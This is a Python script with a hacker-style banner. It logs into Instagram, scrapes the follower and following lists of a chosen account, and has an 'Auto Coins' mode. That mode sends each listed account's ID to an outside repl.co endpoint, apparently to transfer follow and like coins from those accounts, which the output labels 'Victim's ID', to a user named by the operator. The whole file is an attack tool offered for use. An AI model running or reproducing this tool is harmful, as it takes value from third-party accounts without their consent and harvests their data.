import os
try:
 import requests,uuid,instaloader,os
except ModuleNotFoundError:
 os.system('pip install instaloader')
 os.system('pip install requests')
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
logo=(f"""{E}              ._                                            ,
               (`)..                                    ,.-')
                (',.)-..                            ,.-(..`)
                 (,.' ,.)-..                    ,.-(. `.. )
                  (,.' ..' .)-..            ,.-( `.. `.. )
                   (,.' ,.'  ..')-.     ,.-( `. `.. `.. )
                    (,.'  ,.' ,.'  )-.-('   `. `.. `.. )
                     ( ,.' ,.'    _== ==_     `.. `.. )
                      ( ,.'   _==' ~  ~  `==_    `.. )
                       \  _=='   ----..----  `==_   )
                    ,.-:    ,----___.  .___----.    -..
                ,.-'   (   _--====_  \/  _====--_   )  `-..
            ,.-'   .__.'`.  `-_I0_-'    `-_0I_-'  .'`.__.  `-..
        ,.-'.'   .'      (          |  |          )      `.   `.-..
    ,.-'    :    `___--- '`.__.    / __ \    .__.' `---___'    :   `-..
  -'_________`-____________'__ \  (O)  (O)  / __`____________-'________`-
                              \ . _  __  _ . /
                               \ `V-'  `-V' |
                                | \ \ | /  /
                                 V \ ~| ~/V
                                  |  \  /|
                                   \~ | V  
                                    \  |
                                     VV
{B}[+] FaceBook  : @Boy15.Beats
{E}[+] InstaGram : @BoyFtn
{B}[+] TeleGram  : @itzthedevil
{E}[+] GitHub    : @whisper-666
{B}[+] WhatsApp  : +213673336272
{E}====================================""")
def Followers():
 os.system('clear')
 print(logo)
 L = instaloader.Instaloader()
 username=input(G+'[+] UserName ==> ')
 password=input(S+'[+] PassWord ==> ')
 getuser=input(B+'[+] User To Get Followers ==> ')
 os.system(f'rm -rf followers.txt')
 L.login(username,password)
 profile = instaloader.Profile.from_username(L.context, getuser)
 follow_list = []
 count=0
 for followee in profile.get_followers():
    follow_list.append(followee.username)
    file = open(f"followers.txt","a+")
    file.write(follow_list[count])
    file.write("\n")
    file.close()
    print(follow_list[count])
    count=count+1
def Following():
 os.system('clear')
 print(logo)
 L = instaloader.Instaloader()
 username=input(G+'[+] UserName ==> ')
 password=input(S+'[+] PassWord ==> ')
 getuser=input(B+'[+] User To Get Followings ==> ')
 os.system(f'rm -rf following.txt')
 L.login(username,password)
 profile = instaloader.Profile.from_username(L.context, getuser)
 follow_list = []
 count=0
 for followee in profile.get_followees():
    follow_list.append(followee.username)
    file = open(f"following.txt","a+")
    file.write(follow_list[count])
    file.write("\n")
    file.close()
    print(follow_list[count])
    count=count+1
def Fira(id,user,firauser):
 whisper=requests.get(f'https://F.safajj4.repl.co/id={id}/u={firauser}').json()
 followcoin=whisper["Follow Coin"]
 likecoin=whisper["Like Coin"]
 if whisper["Status"] == "Not Success":
  print(f"""{E}[❌] Not Success
{S}[+] Victim's ID ==> {id}
{S}[+] Victim's User ==> {user}
{S}[+] Follow Coins ==>{B}{followcoin}
{S}[+] General Coins ==>{B}{likecoin}
{B}[+] TeleGram ==> @whisper666""")
 if whisper["Status"] == "Success":
  print(f"""{G}[✅] Success Send To ==> {firauser}
{S}[+] Victim's ID ==> {id}
{S}[+] Victim's User ==> {user}
{S}[+] Follow Coins ==>{B}{followcoin}
{S}[+] General Coins ==>{B}{likecoin}
{B}[+] TeleGram ==> @whisper666""")
def UserID(user,firauser):
 L = instaloader.Instaloader()
 profile = str(instaloader.Profile.from_username(L.context,user))
 idd=str(profile.split(')>')[0])
 id=idd.split(' (')[1]
 Fira(id,user,firauser)
def Start():
 os.system('clear')
 print(logo)
 file=input(B+'[+] Users File Path ==> ')
 firauser=input(S+'[+] Enter User To Send The Coins ==> ')
 for Whisper in open(file,'r').read().splitlines():
  username=str(Whisper.split('\n')[0])
  if 'instagram.com' in username:
   u=str(username.split('com/')[1])
   us=str(u.split('?')[0])
   user=us
  else:
   user=username
  whisper=requests.get(f'https://www.instagram.com/{user}')
  if whisper.status_code == 200:
   UserID(user,firauser)
  if whisper.status_code == 404:
   pass
os.system('clear')
print(logo)
Choose=input(f'''{S}[1] Get Users From Followers
{E}[2] Get Users From Following
{B}[3] Auto Coins
{G}[+] Choose ==> ''')
if Choose == '1':
 Followers()
if Choose == '2':
 Following()
if Choose == '3':
 Start()